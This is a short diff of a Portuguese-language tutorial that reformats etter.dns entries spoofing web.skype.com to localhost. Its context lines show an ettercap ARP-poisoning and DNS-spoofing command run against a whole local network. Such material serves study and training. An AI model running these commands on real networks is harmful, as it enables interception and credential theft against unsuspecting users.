@@ -20,8 +20,20 @@ Agora vamos efetuar todo o redirecionamento de pacotes que chegar na porta 80 da
 <b>Agoro iremos configurar o DNS Spoofing.</b><br/>
 Primeiramente edite o arquivos etter.dns do ettercap.<br/>
 `# pico /etc/ettercap/etter.dns`<br/>
-https://web.skype.com/	A	localhost<br/>
-web.skype.com		A	localhost<br/>
+<br/>
+<table border=0>
+  <tr>
+    <td>https://web.skype.com/</td>
+    <td>A</td>
+    <td>localhost</td>
+  </tr>
+  <tr>
+    <td>web.skype.com	</td>
+    <td>A</td>
+    <td>localhost</td>
+  </tr>  
+</table>
+<br/>
 Depois executar o seguinte comando para iniciar o Ettercap:<br/>
 `ettercap -T -q -M arp -i eth0 -P dns_spoof ///`<br/>
 
